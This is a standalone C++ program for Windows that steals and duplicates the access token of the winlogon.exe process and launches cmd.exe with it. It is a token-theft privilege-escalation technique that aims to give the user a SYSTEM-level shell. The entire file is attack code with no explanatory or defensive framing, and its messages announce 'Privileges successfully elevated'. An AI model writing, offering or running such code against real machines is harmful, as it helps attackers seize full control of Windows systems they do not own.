#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                processId = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return processId;
}

BOOL ElevatePrivileges() {
    DWORD pid = GetProcessIdByName(L"winlogon.exe"); // Privileged process
    if (pid == 0) {
        std::wcout << L"Error: Could not retrieve winlogon.exe PID\n";
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::wcout << L"Error: Failed to open winlogon.exe process\n";
        return FALSE;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        std::wcout << L"Error: Failed to retrieve process token\n";
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hNewToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        std::wcout << L"Error: Failed to duplicate token\n";
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a new elevated process with the manipulated token
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        std::wcout << L"Error: Failed to create process with duplicated token\n";
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    std::wcout << L"Elevated process successfully created!\n";
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    if (ElevatePrivileges()) {
        std::wcout << L"Privileges successfully elevated!\n";
    }
    else {
        std::wcout << L"Privilege escalation failed.\n";
    }
    return 0;
}
